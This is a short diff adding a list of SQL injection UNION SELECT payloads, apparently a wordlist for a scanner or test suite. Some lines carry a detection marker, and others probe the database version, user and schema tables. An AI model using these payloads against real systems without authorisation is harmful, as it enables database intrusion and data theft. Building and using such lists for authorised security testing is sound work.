@@ -1,0 +1,7 @@
+' UNION SELECT 'SQLI_UNION_MARKER'--
+' UNION SELECT NULL,'SQLI_UNION_MARKER'--
+' UNION SELECT version()--
+' UNION SELECT current_database()--
+' UNION SELECT current_user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
